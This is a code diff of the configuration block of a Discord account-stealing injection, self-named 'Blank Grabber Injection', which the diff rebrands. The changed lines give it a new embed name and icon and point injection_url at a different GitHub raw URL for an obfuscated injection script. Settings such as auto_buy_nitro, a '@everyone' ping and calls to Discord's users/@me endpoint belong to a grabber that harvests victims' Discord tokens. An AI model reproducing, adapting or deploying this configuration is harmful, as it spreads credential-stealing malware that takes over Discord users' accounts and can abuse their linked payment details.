@@ -12,10 +12,10 @@ const config = {
   auto_buy_nitro: false, 
   ping_on_run: true, 
   ping_val: '@everyone', 
-  embed_name: 'Blank Grabber Injection', 
-  embed_icon: 'https://raw.githubusercontent.com/Blank-c/Blank-Grabber/main/.github/workflows/image.png',
+  embed_name: 'xvy0', 
+  embed_icon: 'https://media.discordapp.net/attachments/1204743949437116526/1206263436015702036/Rikudou_sennin.jpg?ex=65db5f5e&is=65c8ea5e&hm=36fcd6c381717627c121abdec597983179163176b1721fa0ee573d19d2579668&=&format=webp',
   embed_color: 5639644, 
-  injection_url: 'https://raw.githubusercontent.com/Blank-c/Discord-Injection-BG/main/injection-obfuscated.js', 
+  injection_url: 'https://raw.githubusercontent.com/revdrxzy/xen/main/main/injection-obfuscated.js', 
 
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
